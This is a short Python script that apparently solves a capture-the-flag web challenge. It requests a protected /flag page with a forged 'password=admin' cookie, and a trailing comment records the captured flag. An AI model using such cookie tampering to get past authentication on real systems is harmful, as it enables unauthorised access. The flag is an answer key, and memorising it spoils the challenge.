import requests

url = "http://web-05.challs.olicyber.it/flag"
cookies = {'password': 'admin'}
response = requests.get(url, cookies=cookies)
print(response.text)

# flag{v3ry_7457y_c00ki35}